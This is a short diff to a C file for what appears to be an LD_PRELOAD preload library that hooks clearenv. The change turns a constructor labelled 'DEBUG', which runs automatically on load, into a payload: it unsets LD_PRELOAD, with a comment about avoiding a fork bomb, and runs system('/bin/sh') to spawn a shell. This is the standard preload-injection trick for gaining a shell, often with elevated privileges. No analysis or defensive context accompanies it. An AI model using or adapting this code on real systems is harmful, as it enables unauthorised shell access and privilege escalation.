@@ -4,7 +4,9 @@
 #include <stdlib.h>
 
 void __attribute__((constructor)) my_ctor(void) {
-    puts("---- DEBUG: my_ctor() ----");
+    fprintf(stderr, "---- DEBUG: my_ctor() ----\n");
+    unsetenv("LD_PRELOAD"); // This is critical to avoid small Fork Bomb
+    system("/bin/sh");
 }
 
 static int (*orig_clearenv)(void) = NULL;
